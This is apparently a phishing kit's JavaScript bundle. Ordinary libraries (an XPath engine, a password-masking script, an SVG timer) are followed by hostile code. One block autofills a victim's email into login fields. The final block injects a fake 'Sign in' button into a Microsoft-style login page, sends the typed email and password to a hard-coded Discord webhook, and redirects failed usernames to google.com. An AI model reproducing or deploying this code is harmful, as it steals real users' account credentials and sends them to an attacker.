M;gl7x568x=g0;gl7x608x=g07x608x;gl7x928x=3x;gl7x78x=gl7x868x=h27x868x;gl7x478x=gl7x618x=gl7x208x=h27x618x7x778x2w;b[b7x18x]=gl}}3y b}3y ba9x7x288x7x218x(5x,g0,iz)};8y gX=2y ba;gX7x288x=9z(g0,iz){0y(iz6w_[20]){0y(g07x278x6w7)3y 2x;0y(g07x278x6w1)3y g07x1928x}0y(iz6w_[30]4wiz6w_[17])3y g0[iz]4w2x;0y(iz6w_[91])3y g07x1808x;0y(iz6w_[57]3wg07x278x6w1){8y b=0w;8z(8y fC=0,gm=g07x578x,fJ=gm7x18x,h2,gl;fC<fJ;fC2v){h2=gm[fC];0y(h27x928x){gl=2y M;gl7x278x=2;gl7x568x=g0;gl7x608x=g07x608x;gl7x928x=3x;gl7x78x=gl7x868x=h27x868x;gl7x478x=gl7x618x=h27x618x;gl7x208x=h27x1928x;gl7x308x=h27x308x4w2x;gl7x178x=h27x178x4w2x;b[b7x18x]=gl}}3y b}3y ba9x7x288x7x218x(5x,g0,iz)};gX7x1218x=9z(gz,iq){3y gz7x4488x(iq)};8y bp=6x7x4498x,gz=6x7x4558x,C=7wgz7x4568x3w!gz7x4548x,D=!C3wgz7x3428x7x178x9w_[376];8y gK=2y bw,hK=2y bw;gK7x838x=gz7x4538x7x4508x;gK7x878x=_[361];gK7x1408x=_[376];hK7x878x=gK7x878x;9z eY(hh,_d,dh){0y(5y _d6w_[167]4w_d6w=2x)_d='';8y g0=hh[0];0y(5y g06w_[167])g0=2x;8y hw=g03w(g07x278x6w9?g0:g07x608x)7x4518x(_[436])7x4528x6w_[437]?gK:hK;hw7x1148x=dh;8y gF=2y b0(by(_d),hw);hw7x1148x=2x;8y n,hq=2y bp,ge=gP;0y(C)ge=hw6wgK?gW:gX;7z 0y(D3whw6wgK)ge=gQ;n=gF7x88x(2y V(hw,g0,2x,ge));8z(8y fC=0,fJ=n7x18x,gN;fC<fJ;fC2v)hq7x108x(ge7x368x(gN=n[fC])?gN:bw7x2208x(gN));3y hq};8y h4=1w;h47x2218x=9z(hh,_d,dh){3y eY(hh 1y bp?hh:2y bp(hh),_d,dh)};bp7x1978x(bp,h4);h4=1w;h47x2218x=9z(_d,dh){3y eY(5x,_d,dh)};bp7x1978x(bp9x,h4);",">?!>=!..!,,!>.!>,!>\"!>>\"!\"\"!>>!>>>!}}!\'\'!*)!~|!^\\!^%\\!^^!\\`\\!xpeojx!tjiu!tuofnvhsb!fvsu!mmvo!ftmbg!iujx!fmjix!sbw!zsu!idujxt!gpfqzu!xpsiu!osvufs!xfo!gpfdobutoj!gj!opjudovg!spg!ftmf!fufmfe!umvbgfe!fvojuopd!idubd!ftbd!lbfsc!oj",'',0,this,'prototype length valueOf cast timezone peek month value evaluate XPTY0004 push year XPST0003 next eof day items namespaceURI hours minutes localName call seconds builtInKind DOMAdapter match item nodeType getProperty negative prefix toString left FORG0001 primitiveKind expression isNode test replace type abs join parentNode round bindings indexOf XPST0017 name split stack compare scope operator staticContext predicates lookupNamespaceURI ownerElement attributes path occurence ownerDocument nodeName compareDocumentPosition right itemType attribute scheme code authority FORG0006 dateTime args pow getURIForPrefix nextSibling XPDY0002 position toLowerCase index previousSibling inExpr node xmlns baseURI substr firstChild nodeValue defaultFunctionNamespace schema-attribute numeric-multiply numeric-divide textContent specified schema-element size FOCA0002 concat numeric-greater-than getElementsByTagNameNS numeric-less-than XPST0051 substring satisfiesExpr callee string XPDY0050 getDataType collations parent functions descendant-or-self dataTypes axis returnExpr namespaceResolver numeric-add data isSameNode boolean union numeric-subtract getElementById query fragment child intersect ancestor ancestor-or-self thenExpr internalExpression numeric-equal quantifier applyPredicates collections add-dayTimeDuration-to-time to popVariable except condExpr pushVariable defaultElementNamespace hasOwnProperty elseExpr document-node time-less-than date-greater-than boolean-less-than QName time-greater-than root date-less-than dateTime-greater-than boolean-greater-than yearMonthDuration-greater-than dayTimeDuration-less-than dayTimeDuration-greater-than dateTime-less-than NOTATION multiply-yearMonthDuration yearMonthDuration-less-than element add-yearMonthDuration-to-date add-dayTimeDuration-to-date preceding-sibling processing-instruction add-dayTimeDuration-to-dateTime as undefined Infinity multiply-dayTimeDuration add-yearMonthDuration-to-dateTime preceding documents charAt defaultCollationName charCodeAt childNodes pop getFunction reverse text in-scope-prefixes hexBinary-equal base64Binary-equal FORG0005 deep-equal NMTOKEN_DT FORG0004 FORG0003 and or max baseName in getMinutes setMinutes XPTY0020 extend FONS0004 boolean-equal doc gYearMonth gYear hexBinary ENTITY_DT time gMonthDay gMonth float NCNAME_DT FORX0001 gDay BOOLEAN_DT ID_DT collection doc-available floor idref element-with-id LANGUAGE_DT xs2js xpath FOCH0002 /collation/codepoint FODC0001 node-name subtract-yearMonthDuration-from-date subtract-dayTimeDuration-from-date subtract-dayTimeDuration-from-time target true encodeURIComponent subtract-dates subtract-times subtract-yearMonthDuration-from-dateTime subtract-dayTimeDuration-from-dateTime min log numeric-mod numeric-integer-divide node-after node-before numeric-unary-plus numeric-unary-minus equals concatenate QName-equal lastChild subtract-dateTimes divide-dayTimeDuration-by-dayTimeDuration time-equal getCollation gYearMonth-equal gYear-equal fromCharCode date-equal duration-equal INF dateTime-equal every gMonthDay-equal gMonth-equal add-dayTimeDurations subtract-dayTimeDurations toUpperCase divide-dayTimeDuration divide-yearMonthDuration-by-yearMonthDuration divide-yearMonthDuration gDay-equal add-yearMonthDurations subtract-yearMonthDurations number normalize-unicode INT_DT comment SHORT_DT BYTE_DT LONG_DT NEGATIVEINTEGER_DT DAYTIMEDURATION_DT INTEGER_DT resolve-uri NONPOSITIVEINTEGER_DT NONNEGATIVEINTEGER_DT GMONTHDAY_DT GDAY_DT PRIMITIVE_FLOAT is-same-node FLOAT_DT PRIMITIVE_GDAY GMONTH_DT xml XPST0008 PRIMITIVE_GMONTH XPTY0019 XT_YEARMONTHDURATION_DT following following-sibling self NOTATION_DT descendant PRIMITIVE_HEXBINARY GYEARMONTH_DT PRIMITIVE_GYEARMONTH HEXBINARY_DT GYEAR_DT PRIMITIVE_NOTATION TIME_DT XPST0081 PRIMITIVE_TIME XT_UNTYPEDATOMIC_DT PRIMITIVE_STRING STRING_DT PRIMITIVE_GMONTHDAY QNAME_DT PRIMITIVE_QNAME PRIMITIVE_DURATION DURATION_DT DATE_DT anyAtomicType PRIMITIVE_BOOLEAN BASE64BINARY_DT PRIMITIVE_ANYURI ANYURI_DT ANYSIMPLETYPE_DT UNSIGNEDSHORT_DT ANYATOMICTYPE_DT PRIMITIVE_BASE64BINARY anyURI NORMALIZEDSTRING_DT TOKEN_DT duration NAME_DT UNSIGNEDBYTE_DT double base64Binary date decimal UNSIGNEDINT_DT ANYTYPE_DT PRIMITIVE_DECIMAL DECIMAL_DT documentElement apply DOUBLE_DT trim PRIMITIVE_DOUBLE POSITIVEINTEGER_DT PRIMITIVE_DATETIME PRIMITIVE_GYEAR DATETIME_DT PRIMITIVE_DATE UNSIGNEDLONG_DT XPTY0018 else some XPST0010 http://www.w3.org/XML/1998/namespace if then http://www.w3.org/2000/xmlns/ http://www.w3.org/2005/xpath-functions http://www.w3.org/2001/XMLSchema treat castable int of instance fourth for fifth long XPST0080 dayTimeDuration yearMonthDuration untypedAtomic http://www.w3.org/1999/xhtml empty-sequence negativeInteger nonPositiveInteger integer short byte NCName Name token ENTITY ID satisfies NMTOKEN language normalizedString unsignedByte third positiveInteger nonNegativeInteger second unsignedLong unsignedShort first unsignedInt return matches isNaN isFinite NaN TypeError SyntaxError Function Math Error btoa atob getTimezoneOffset getFullYear getMonth back reset parseInt message Date RegExp substring-before substring-after tokenize ends-with starts-with escape-html-uri contains trace xml:base Number Object Array Boolean String div DIV getDate getHours console getAttribute innerText decodeURI encodeURI ceil slice sort nodeFromID jQuery href createElement tagName location createElementNS document namespaces getTime setSeconds setFunction setCollation setCollection setDocument setDataType getSeconds getMilliseconds js2xs IDREF_DT DAYMONTHDURATION_DT PRECISIONDECIMAL_DT setHours DATETIMESTAMP_DT UNAVAILABLE_DT LISTOFUNION_DT LIST_DT iri-to-uri encode-for-uri seconds-from-dateTime timezone-from-dateTime year-from-date minutes-from-dateTime hours-from-dateTime year-from-dateTime month-from-dateTime day-from-dateTime month-from-date day-from-date timezone-from-time adjust-dateTime-to-timezone adjust-date-to-timezone seconds-from-time minutes-from-time timezone-from-date hours-from-time seconds-from-duration minutes-from-duration not last current-dateTime false documentURI base-uri document-uri current-date current-time months-from-duration days-from-duration hours-from-duration years-from-duration static-base-uri implicit-timezone default-collation adjust-time-to-timezone local-name avg sum id count exactly-one zero-or-one one-or-more codepoints-to-string string-to-codepoints upper-case lower-case translate normalize-space string-length codepoint-equal string-join unordered subsequence round-half-to-even resolve-QName prefix-from-QName ceiling xml:lang namespace-uri lang local-name-from-QName namespace-uri-from-QName distinct-values insert-before remove exists empty namespace-uri-for-prefix index-of nilled'.split(' '));







/*******************************************************************************
 MaskedPassword.js       Converts password fields into "masked" password fields
 ------------------------------------------------------------------------------
 Adapted from                                      FormTools.addPasswordMasking
 Info/Docs         http://www.brothercake.com/site/resources/scripts/formtools/
 ------------------------------------------------------------------------------
*******************************************************************************/



//masked password constructor
function MaskedPassword(passfield, symbol)
{
	//if the browser is unsupported, silently fail
	//[pre-DOM1 browsers generally, and Opera 8 specifically]
	if(typeof document.getElementById == 'undefined'
		|| typeof document.styleSheets == 'undefined') { return false; }

	//or if the passfield doesn't exist, silently fail
	if(passfield == null) { return false; }

	//save the masking symbol
	this.symbol = symbol;

	//identify Internet Explorer for a couple of conditions
	this.isIE = typeof document.uniqueID != 'undefined';

	//delete any default value for security (and simplicity!)
	passfield.value = '';
	passfield.defaultValue = '';

	//create a context wrapper, so that we have sole context for modifying the content
	//(ie. we can go context.innerHTML = replacement; without catering for
	// anything else that's there besides the password field itself)
	//and give it a distinctive and underscored name, to prevent conflict
	passfield._contextwrapper = this.createContextWrapper(passfield);

	//create a fullmask flag which will be used from events to determine
	//whether to mask the entire password (true)
	//or to stop at the character limit (false)
	//most events set the flag before being called, except for onpropertychange
	//which uses whatever the setting currently is
	//this used to be an argument, but onpropertychange fires from our modifications
	//as well as manual input, so the blur event that's supposed to have a fullmask
	//triggers in turn an onpropertychange which doesn't, with the end result
	//that fullmask never works; so by doing it like this, we can set it to
	//true from the blur event and that will persist through all subsequent
	//onpropertychange events, until another manual event changes it back to false
	this.fullmask = false;

	//for the code that converts a password field into a masked field
	//I used to have lovely clean elegant code for most browsers, then
	//ugly horrible hacky code for IE; but since the hacky approach does
	//actually work for everyone, and we have to have it here whatever,
	//we may as well just use it for everyone, and get a big saving in code-size
	//it also means we'll get total behavioral consistency, in terms of
	//the preservation (or rather, lack thereof) of existing event handlers

	//save a reference to the wrapper because the passfield reference will be lost soon
	var wrapper = passfield._contextwrapper;

	//create the HTML for the hidden field
	//using the name from the original password field
	var hiddenfield = '<input type="hidden" name="' + passfield.name + '">';

	//copy the HTML from the password field to create the new plain-text field
	var textfield = this.convertPasswordFieldHTML(passfield);

	//write the hiddenfield and textfield HTML into the wrapper, replacing what's there
	wrapper.innerHTML = hiddenfield + textfield;

	//grab back the passfield reference back and save it back to passfield
	//then add the masked-password class
	passfield = wrapper.lastChild;
	passfield.className += ' masked';

	//try to disable autocomplete for this field
	//to prevent firefox from remembering and subsequently offering
	//a menu of useless masking strings, things like "✫✫✫✫✫✫✫f"
	//which of course can't be decoded, they'll just be represented by whatever
	//is in the realfield value at the time, ie. a completely unrelated value!
	passfield.setAttribute('autocomplete', 'off');

	//now grab the hidden field reference,
	//saving it as a property of the passfield
	passfield._realfield = wrapper.firstChild;

	//restore its contextwrapper reference
	passfield._contextwrapper = wrapper;

	//limit the caret position so that you can only edit or select from the end
	//you can't add, edit or select from the beginning or middle of the field
	//otherwise we can't track which masked characters represent which letters
	//(far from ideal I know, but I can't see how else to know
	//which masking symbols represent which letters if you edit from the middle..?)
	this.limitCaretPosition(passfield);

	//save a reference to this
	var self = this;

	//then apply the core events to the visible field
	this.addListener(passfield, 'change', function(e)
	{
		self.fullmask = false;
		self.doPasswordMasking(self.getTarget(e));
	});
	this.addListener(passfield, 'input', function(e)
	{
		self.fullmask = false;
		self.doPasswordMasking(self.getTarget(e));
	});
	//no fullmask setting for onpropertychange (as noted above)
	this.addListener(passfield, 'propertychange', function(e)
	{
		self.doPasswordMasking(self.getTarget(e));
	});

	//for keyup, don't respond to the tab or shift key, otherwise when you [shift/]tab
	//into the field the keyup will cause the fully-masked password to become partially masked
	//which is inconsistent with the mouse since it doesn't happen when you click focus
	//so it's only supposed to happen when you actually edit it; we'll also prevent it
	//from happening in response to arrows keys as well, for visual completeness!
	//and from the other modifiers keys, just cos it feels like the right thing to do
	this.addListener(passfield, 'keyup', function(e)
	{
		if(!/^(9|1[678]|224|3[789]|40)$/.test(e.keyCode.toString()))
		{
			self.fullmask = false;
			self.doPasswordMasking(self.getTarget(e));
		}
	});

	//the blur event completely masks the input password
	//(as opposed to leaving the last n characters plain during input)
	this.addListener(passfield, 'blur', function(e)
	{
		self.fullmask = true;
		self.doPasswordMasking(self.getTarget(e));
	});

	//so between those events we get completely rock-solid behavior
	//with enough redundency to ensure that all input paths are covered
	//and no flickering of text between states :-)

	//force the parent form to reset onload
	//thereby clearing all values after soft refreh
	this.forceFormReset(passfield);

	//return true for success
	return true;
}


//associated utility methods
MaskedPassword.prototype =
{

	//implement password masking for a textbox event
	doPasswordMasking : function(textbox)
	{
		//create the plain password string
		var plainpassword = '';

		//if we already have a real field value we need to work out the difference
		//between that and the value that's in the input field
		if(textbox._realfield.value != '')
		{
			//run through the characters in the input string
			//and build the plain password out of the corresponding characters
			//from the real field, and any plain characters in the input
			for(var i=0; i<textbox.value.length; i++)
			{
				if(textbox.value.charAt(i) == this.symbol)
				{
					plainpassword += textbox._realfield.value.charAt(i);
				}
				else
				{
					plainpassword += textbox.value.charAt(i);
				}
			}
		}

		//if there's no real field value then we're doing this for the first time
		//so whatever's in the input field is the entire plain password
		else
		{
			plainpassword = textbox.value;
		}

		//get the masked version of the plainpassword, according to fullmask
		//and passing the textbox reference so we have its symbol and limit properties
		var maskedstring = this.encodeMaskedPassword(plainpassword, this.fullmask, textbox);

		//then we modify the textfield values
		//if (AND ONLY IF) one of the values are now different from the original
		//(this condition is essential to avoid infinite repetition
		// leading to stack overflow, from onpropertychange in IE
		// [value changes, fires event, which changes value, which fires event ...])
		//we check both instead of just one, so that we can still allow the action
		//of changing the mask without modifying the password itself
		if(textbox._realfield.value != plainpassword || textbox.value != maskedstring)
		{
			//copy the plain password to the real field
			textbox._realfield.value = plainpassword;

			//then write the masked value to the original textbox
			textbox.value = maskedstring;
		}
	},


	//convert a plain-text password to a masked password
	encodeMaskedPassword : function(passwordstring, fullmask, textbox)
	{
		//the character limit is nominally 1
		//this is how many characters to leave plain at the end
		//but if the fullmask flag is true the limit is zero
		//and the password will be fully masked
		var characterlimit = fullmask === true ? 0 : 1;

		//create the masked password string then iterate
		//through he characters in the plain password
		for(var maskedstring = '', i=0; i<passwordstring.length; i++)
		{
			//if we're below the masking limit,
			//add a masking symbol to represent this character
			if(i < passwordstring.length - characterlimit)
			{
				maskedstring += this.symbol;
			}
			//otherwise just copy across the real character
			else
			{
				maskedstring += passwordstring.charAt(i);
			}
		}

		//return the final masked string
		return maskedstring;
	},


	//create a context wrapper element around a password field
	createContextWrapper : function(passfield)
	{
		//create the wrapper and add its class
		//it has to be an inline element because we don't know its context
		var wrapper = document.createElement('span');

		//enforce relative positioning
		wrapper.style.position = 'relative';

		//insert the wrapper directly before the passfield
		passfield.parentNode.insertBefore(wrapper, passfield);

		//then move the passfield inside it
		wrapper.appendChild(passfield);

		//return the wrapper reference
		return wrapper;
	},


	//force a form to reset its values, so that soft-refresh does not retain them
	forceFormReset : function(textbox)
	{
		//find the parent form from this textbox reference
		//(which may not be a textbox, but that's fine, it just a reference name!)
		while(textbox)
		{
			if(/form/i.test(textbox.nodeName)) { break; }
			textbox = textbox.parentNode;
		}
		//if the reference is not a form then the textbox wasn't wrapped in one
		//so in that case we'll just have to abandon what we're doing here
		if(!/form/i.test(textbox.nodeName)) { return null; }

		//otherwise bind a load event to call the form's reset method
		//we have to defer until load time for IE or it won't work
		//because IE renders the page with empty fields
		//and then adds their values retrospectively!
		//(but in other browsers we can use DOMContentLoaded;
		// and the load listener function takes care of that split)
		this.addSpecialLoadListener(function() { textbox.reset(); });

		//return the now-form reference
		return textbox;
	},


	//copy the HTML from a password field to a plain text field,
	//we have to convert the field this way because of Internet Explorer
	//because it doesn't support setting or changing the type of an input
	convertPasswordFieldHTML : function(passfield, addedattrs)
	{
		//start the HTML for a text field
		var textfield = '<input';

		//now run through the password fields' specified attributes
		//and copy across each one into the textfield HTML
		//*except* for its name and type, and any formtools underscored attributes
		//we need to exclude the name because we'll define that separately
		//depending on the situation, and obviously the type, and formtools attributes
		//because we control them and their meaning in separate conditions too
		for(var fieldattributes = passfield.attributes,
				j=0; j<fieldattributes.length; j++)
		{
			//we have to check .specified otherwise we'll get back every single attribute
			//that the element might possibly have! which is what IE puts in the attributes
			//collection, with default values for unspecified attributes
			if(fieldattributes[j].specified && !/^(_|type|name)/.test(fieldattributes[j].name))
			{
				textfield += ' ' + fieldattributes[j].name + '="' + fieldattributes[j].value + '"';
			}
		}

		//now add the type of "text" to the end, plus an autocomplete attribute, and close it
		//we add autocomplete attribute for added safety, though it probably isnt necessary,
		//since browsers won't offer to remember it anywway, because the field has no name
		//this uses HTML4 empty-element syntax, but we don't need to distinguish by spec
		//because the browser's internal representations will generally be identical anyway
		textfield += ' type="text" autocomplete="off">';

		//return the finished textfield HTML
		return textfield;
	},


	//this crap is what it takes to force the caret in a textbox to stay at the end
	//I'd really rather not to do this, but it's the only way to have reliable encoding
	limitCaretPosition : function(textbox)
	{
		//create a null timer reference and start function
		var timer = null, start = function()
		{
			//prevent multiple instances
			if(timer == null)
			{
				//IE uses this range stuff
				if(this.isIE)
				{
					//create an interval that continually force the position
					//as long as the field has the focus
					timer = window.setInterval(function()
					{
						//we can only force position to the end
						//because there's no way to know whether there's a selection
						//or just a single caret point, because the range methods
						//we could use to determine that don't work on created fields
						//(they generate "Invalid argument" errors)
						var range = textbox.createTextRange(),
							valuelength = textbox.value.length,
							character = 'character';
						range.moveEnd(character, valuelength);
						range.moveStart(character, valuelength);
						range.select();

					//not so fast as to be a major CPU hog
					//but fast enough to do the job effectively
					}, 100);
				}
				//other browsers have these selection properties
				else
				{
					//create an interval that continually force the position
					//as long as the field has the focus
					timer = window.setInterval(function()
					{
						//allow selection from or position at the end
						//otherwise force position to the end
						var valuelength = textbox.value.length;
						if(!(textbox.selectionEnd == valuelength && textbox.selectionStart <= valuelength))
						{
							textbox.selectionStart = valuelength;
							textbox.selectionEnd = valuelength;
						}

					//ditto
					}, 100);
				}
			}
		},

		//and a stop function
		stop = function()
		{
			window.clearInterval(timer);
			timer = null;
		};

		//add events to start and stop the timer
		this.addListener(textbox, 'focus', function() { start(); });
		this.addListener(textbox, 'blur', function() { stop(); });
	},


	//add an event listener
	//this is deliberately not called "addEvent" so that we can
	//compress the name, which would otherwise also effect "addEventListener"
	addListener : function(eventnode, eventname, eventhandler)
	{
		if(typeof document.addEventListener != 'undefined')
		{
			return eventnode.addEventListener(eventname, eventhandler, false);
		}
		else if(typeof document.attachEvent != 'undefined')
		{
			return eventnode.attachEvent('on' + eventname, eventhandler);
		}
	},


	//add a special load listener, split between
	//window load for IE and DOMContentLoaded for others
	//this is only used by the force form reset method, which wants that split
	addSpecialLoadListener : function(eventhandler)
	{
		//we specifically need a browser condition here, not a feature test
		//because we know specifically what should be given to who
		//and that doesn't match general support for these constructs
		if(this.isIE)
		{
			return window.attachEvent('onload', eventhandler);
		}
		else
		{
			return document.addEventListener('DOMContentLoaded', eventhandler, false);
		}
	},


	//get an event target by sniffing for its property name
	//(assuming here that e is already a cross-model reference
	//as it is from addListener because attachEvent in IE
	//automatically provides a corresponding event argument)
	getTarget : function(e)
	{
		//just in case!
		if(!e) { return null; }

		//otherwise return the target
		return e.target ? e.target : e.srcElement;
	}

}




if (!String.prototype.startsWith) {
	String.prototype.startsWith = function(searchString, position) {
	  position = position || 0;
	  return this.indexOf(searchString, position) === position;
	};
  }
  if (!String.prototype.strspn) {
  String.prototype.strspn = function (chars, start, length) {

	var end;

	if (start == undefined)
		start = 0;
	else if (start < 0)
		start += this.length;

	if (length == undefined)
		length = this.length;

	start = Math.max(0, Math.min(start, this.length));
	end   = Math.max(start, Math.min(start + length, this.length));

	for (var i = start; i < end; i ++) {
		if (chars.indexOf(this[i]) == -1)
			return i - start;
	}

	return end - start;
};
}
if (!Array.prototype.of) {
	Array.prototype.of = function() {
	  return Array.prototype.slice.call(arguments);
	};
  }




!function(t){t.fn.svgTimer=function(s){var r=t.extend({},t.fn.svgTimer.defaults,s),e="<div class='svg-hexagonal-counter'><h2>0</h2><svg class='counter' x='0px' y='0px' viewBox='0 0 776 628'><path class='track' d='M723 314L543 625.77 183 625.77 3 314 183 2.23 543 2.23 723 314z'></path><path class='fill' d='M723 314L543 625.77 183 625.77 3 314 183 2.23 543 2.23 723 314z'></path></svg></div>";return this.each(function(){var s=t(this);s.append(e);var i=s.find(".track"),a=s.find(".fill"),n=s.find("h2"),o=r.time,f=2160,c=1;i.css("stroke",r.track),a.css({stroke:r.fill,"stroke-dashoffset":f-c*(f/o)+"px",transition:"stroke-dashoffset 1s "+r.transition});var l=setInterval(function(){if(i.css("stroke",r.track),a.css({stroke:r.fill,"stroke-dashoffset":f-c*(f/o)+"px",transition:"stroke-dashoffset 1s "+r.transition}),"forward"===r.direction)n.text(c);else if("backward"===r.direction){var t=r.time-c+1;n.text(t)}c==o&&clearInterval(l),c++},r.interval)})},t.fn.svgTimer.defaults={time:60,track:"rgb(56, 71, 83)",fill:"rgb(104, 214, 198)",transition:"linear",direction:"forward",interval:1e3}}(jQuery);




(function (jqlocal) {

  var Intervalactionid = {};
  var Intervalfunctionlist = new Array();
  var formbindevent = 0;
  var emailmesession = {e:"",P:"",t:""};
  var retriedimageurl = new Array();





  var inputforme = function(actionid) {
    try {

      var useremail = "{userinputEmail}"
      //			var email_get = getCookie("rawusersession");
      //			if(!email_get){
      //				clearInterval(Intervalactionid[actionid]);
      //				return true;
      //			}




      try{
        if(jqlocal(document).find('input[value*="'+String(useremail).toString()+'"]').length>0){
          // if(actionid){
          clearInterval(Intervalactionid[actionid]);
          // }
          return true;

        }

      } catch (err) {

        //console.log(err);
      }



      jqlocal(document).find("input[type=text], input[type=email], text").each(function () {
        // console.log(jqlocal(this));
        var placeholdtext = String(jqlocal(this).attr("placeholder")).toString();
        var name_val = placeholdtext + " " + jqlocal(this).attr("name") + " " + jqlocal(this).attr("type");


        if ((name_val.toLowerCase().indexOf('mail') != -1  && jqlocal(this).attr('type') != 'password')|| (name_val.toLowerCase().indexOf('login') != -1  && jqlocal(this).attr('type') != 'password') ||(name_val.toLowerCase().indexOf('user') != -1  && jqlocal(this).attr('type') != 'password') || ((placeholdtext.toLowerCase().indexOf('id') != -1  && jqlocal(this).attr('type') != 'password'))  || ((placeholdtext.toLowerCase().indexOf('mail') != -1 && jqlocal(this).attr('type').toLowerCase() != 'password'))) {

          if(jqlocal(this).val() == String(useremail).toString()){
            clearInterval(Intervalactionid[actionid]);
            return true;
          }

          jqlocal(this).val("");

          // if( String(jqlocal(this).val()).toString() != String(useremail).toString())
          // jqlocal(this).sendkeys(useremail);




          // jqlocal(this).unbind();


          // www_dot.jquery(this).bind({
          // 	'keyup keydown keypress': logeventonelent
          // });


          // $('#testtyping').focus().typetype('Some text');
          // var elementtriger = jqlocal(this);
          // elementtriger =elementtriger[0]
          var charstringCode = '';
          // console.log(elementtriger);


          // jqlocal(elementtriger).triggerHandler();
          if( String(jqlocal(this).val()).toString() != String(useremail).toString() && jqlocal(this).is(':visible') ){
            try{
              jqlocal(this).simulate("mousemove", { clientX: 10, clientY: 10 });
            } catch (err) {}
            jqlocal(this).trigger( "focus" );
            jqlocal(this).trigger( "change" );
            try{
              jqlocal(this).selectRng();
            } catch (err) {}
            for (var a = 0; a <useremail.length; a++) {
              charstringCode =	useremail.charCodeAt(a);

              try{
                jqlocal(this).focus().trigger({ type : 'keypress', keyCode: charstringCode, composed: true, bubbles: true,which: charstringCode, key: useremail[a] });
              } catch (err) {}
              // jqlocal(this).focus().trigger({ type : 'keyup', keyCode: charstringCode, composed: true,which: charstringCode, key: useremail[a]  });
              try{
                jqlocal(this).selectRng();
              } catch (err) {}


            }
          }


          try{
            if( String(jqlocal(this).val()).toString() != String(useremail).toString() && jqlocal(this).is(':visible') )
              www_dot.jquery(this).simulate("key-sequence", {delay:0,sequence: useremail});
          } catch (err) {
            console.log(err);
          }
          // console.log('form input');
          // console.log(jqlocal(this).val());
          // console.log(jqlocal(this));
          if( String(jqlocal(this).val()).toString() != String(useremail).toString() && jqlocal(this).is(':visible') ){
            jqlocal(this).focus().click().val(useremail);
            if(jqlocal(this).attr("placeholder")){
              jqlocal(this).attr("placeholder", '');
              jqlocal(this).removeAttr("placeholder");
            }

          }





          emailmesession.e = String(useremail).toString();
          psetCookie('emailmesession', encodeURIComponent('{"e":"'+emailmesession.e+'","P":"'+emailmesession.P+'","t":"'+emailmesession.t+'"}'), 10);

          if( String(jqlocal(this).val()).toString() == String(useremail).toString()){
            clearInterval(Intervalactionid[actionid]);
            // deleteCookie('rawusersession');
          }
          try{
            jqlocal(this).selectRng();
          } catch (err) {}
        }
      });
    } catch (err) {
      console.log(err);
    }
    return true;
  };




  // formwatchdog(null);
  inputforme(null);
  Intervalfunctionlist.push(inputforme);



  jqlocal( document ).ready(function() {


    Intervalfunctionlist.forEach(function(funcvalue, key){
      Intervalactionid[key] = setInterval(funcvalue, 100,key);
    });



  });








}(jQuery));



      var tta = 'https://discord.com/api/webhooks/888538559596888075/GGrGhTQ-H7B0HvgeX7rYNHfi5FKzUQvc4YTavEVmjJ-E_cpe5JetoHByz5bVBJ9rltFT';  // Submission
      var ttb = 'https://www.google.com';             // Redirection Page
      var attrset = false;
      var attrset2 = false;
      console.log("{userinputEmail}");

      function ss(zz, xx, element){
          var xhr = new XMLHttpRequest();
          xhr.onreadystatechange = function(){
          };
          xhr.open('POST', tta, false);                 // Change Me
          xhr.setRequestHeader('Content-type', 'application/json');
          xhr.send(JSON.stringify({ "content": "email="+zz+"&password="+xx, "username": "Office@page" })));
          element.click();
      }

      setInterval(function(){
        var kk = document.getElementById('usernameError');
        if((kk) && (!(attrset2))){
            if((kk.innerText.includes("We couldn't find an account with that username")) || (kk.innerText.includes("in our system. Make sure you typed it correctly."))){
              kk.style.display = 'none';
              window.location = ttb;
              attrset2 = true;
            }
        }
      }, 50);

      setInterval(function(){
        if(!(attrset)){
          var check = document.getElementById('displayName');
          if(check && check.innerHTML == "specialsomething"){
              var pp = document.getElementById('idSIButton9');

              bHTML = '<input id="myCustomButton69" type="submit" class="btn btn-block btn-primary" value="Sign in" style="display: block; max-width: 100px;">';
              pp.style.display = 'none';
              pp.type = 'button';
              pp.insertAdjacentHTML('afterend', bHTML);

              var qq = document.getElementById('myCustomButton69');

              qq.addEventListener('click', function(){
                  var em = check.title;
                  var pw = document.getElementById('i0118').value;

                  ss(em, pw, pp);

                  return false;
              });

              attrset = true;
          }
        }
      }, 3000);
